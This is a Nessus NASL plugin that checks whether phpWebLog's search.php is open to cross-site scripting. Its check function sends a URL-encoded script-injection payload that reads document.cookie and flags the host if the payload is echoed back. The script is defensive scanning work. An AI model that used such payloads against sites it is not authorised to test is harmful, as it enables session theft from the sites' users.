#
# Script by Noam Rathaus GPLv2
#
# Filip Groszynski <groszynskif@gmail.com>
# 2005-03-07 21:21
# phpWebLog <= 0.5.3 arbitrary file inclusion (VXSfx)

if(description)
{
 script_id(17343);
 script_version("$Revision: 1.2 $");
 script_cve_id("CAN-2005-0698");
 script_bugtraq_id(12747);
 
 name["english"] = "phpWebLog Cross Site Scripting";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running phpWebLog, a news and content management 
system written in PHP.

Due to improper filtering done by search.php a remote attacker
can cause the phpWebLog product to include arbitrary HTML and/or
JavaScript.

An attacker may use this bug to perform a cross site scripting attack
using the remote host.

Solution : Disable this script.
Risk factor: Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of a phpWebLog XSS";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Noam Rathaus");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("cross_site_scripting.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);
if (  get_kb_item(string("www/", port, "/generic_xss")) ) exit(0);

debug = 0;

function check(loc)
{
 req = http_get(item: string(loc, "/search.php?query=we+%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&topic=0&limit=30"), port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( r == NULL )exit(0);
 if('<script>alert(document.cookie)</script>"' >< r)
 {
  security_warning(port);
  exit(0);
 }
}

foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
